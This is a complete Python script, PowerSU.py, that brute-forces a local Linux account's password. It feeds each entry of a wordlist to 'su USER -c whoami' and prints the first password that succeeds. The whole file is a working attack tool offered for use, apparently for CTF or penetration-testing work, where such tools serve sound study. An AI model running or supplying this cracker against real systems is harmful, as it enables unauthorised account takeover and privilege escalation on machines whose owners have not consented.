#!/usr/bin/env python3

import os
import sys
import argparse
import subprocess
import signal

class colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"

class sets:
    set1 = '['
    set2 = ']'
    set3 = '☻'
    set4 = '✔'
    set5 = '>'
    set6 = '<'
    set7 = '-'
    set8 = '☠'
    set9 = 'python3 PowerSU.py'
    set10 = 'WORDLIST'
    set11 = 'USER'
    set12 = 'Usage:'
    set13 = 'Username:'
    set14 = 'Wordlist:'
    set15 = 'Password:'
    set16 = 'Line:'
    set17 = 'Status:'

class box:
    BOX1 = f"{colors.WHITE}{sets.set1}{colors.RED}{sets.set8}{colors.WHITE}{sets.set2}{colors.RESET}"
    BOX2 = f"{colors.WHITE}{sets.set1}{colors.RED}{sets.set7}{colors.WHITE}{sets.set2}{colors.RESET}"
    BOX3 = f"{colors.WHITE}{sets.set1}{colors.GREEN}{sets.set3}{colors.WHITE}{sets.set2}{colors.RESET}"
    BOX4 = f"{colors.WHITE}{sets.set1}{colors.GREEN}{sets.set4}{colors.WHITE}{sets.set2}{colors.RESET}"


def help():
    print()
    print(f"{box.BOX3} {colors.RED}{sets.set12} {colors.WHITE}{sets.set9} -u {colors.RED}{sets.set6}{colors.WHITE}{sets.set11}{colors.RED}{sets.set5}{colors.WHITE} -w {colors.RED}{sets.set6}{colors.WHITE}{sets.set10}{colors.RED}{sets.set5}{colors.RESET}")
    print()

def info(username, wordlist):
    print(f"{box.BOX4} {colors.WHITE}{sets.set13} {colors.MAGENTA}{username}{colors.RESET}")
    os.system("sleep 1")
    print(f"{box.BOX4} {colors.WHITE}{sets.set14} {colors.MAGENTA}{wordlist}{colors.RESET}")
    os.system("sleep 1")
    print(f"{box.BOX3} {colors.WHITE}{sets.set17}{colors.RESET}")
    os.system("sleep 1")

def ctrl_c(signal, frame):
    print()
    sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-u', '--username', type=str, help='Username')
    parser.add_argument('-w', '--wordlist', type=str, help='Wordlist')
    args = parser.parse_args()

    signal.signal(signal.SIGINT, ctrl_c)

    if args.username:
        info(args.username, args.wordlist)
    else:
        help()
        sys.exit(0)

    with open(args.wordlist, 'rb') as f:
       lines = f.readlines()
       siz = len(lines)

    for line_number, password in enumerate(lines, start=1):
        password = password.decode('latin-1').strip()  # Decode using a suitable encoding
        progress = line_number * 100 // siz
        print(f"\033[?25l\r\033[K{colors.MAGENTA}    {line_number}/{siz}/{progress}%/{password}{colors.RESET}", end="")
        sys.stdout.flush()

        try:
           subprocess.run(["su", args.username, "-c", "whoami"], input=password.encode(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=0.1, check=True)
        except subprocess.TimeoutExpired:
            
            continue  # Skip to the next password attempt
        except subprocess.CalledProcessError:
            pass
        else:
            # Password successfully decrypted
            print(f"\n{box.BOX1} {colors.RED}{sets.set15} {colors.GREEN}{password} {colors.RED}{sets.set16} {colors.GREEN}{line_number}{colors.RESET}")
            print(f"{colors.WHITE}{colors.RESET}")
            sys.exit(0)

if __name__ == "__main__":
    main()
